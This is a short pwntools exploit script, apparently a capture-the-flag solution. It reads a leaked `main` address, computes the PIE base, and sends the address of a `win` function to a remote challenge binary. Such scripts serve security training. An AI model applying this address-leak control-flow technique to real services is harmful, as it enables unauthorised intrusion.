from pwn import log, ELF, process


def exploit(binary: ELF, io: process):
    io.recvuntil(b":")
    main_line = io.recvline().decode()

    main_addr = int(main_line.strip().split()[-1], 16)
    main_offset = binary.symbols["main"]
    win_offset = binary.symbols["win"]

    pie_base = main_addr - main_offset
    log.info(f"main offset: {hex(main_offset)}")
    log.info(f"PIR base = main_addr - main_offset: {hex(pie_base)}")

    win_addr = pie_base + win_offset
    log.info(f"win offset: {hex(win_offset)}")
    log.info(f"win_addr = pie_base + win_offset: {hex(win_addr)}")

    io.sendline(hex(win_addr))



if __name__ == "__main__":
    import sys
    from pwn import context, remote, ELF

    context.log_level = "debug"
    
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <binary>")
        exit()
    

    binary = ELF(sys.argv[3]) 

    try:
        io = remote(sys.argv[1], int(sys.argv[2]))
    except Exception:
        exit()

    exploit(binary, io)

    try:
        print(io.recvall().decode(errors="ignore"))
    except EOFError:
        raise EOFError("Failed to receive all output.")
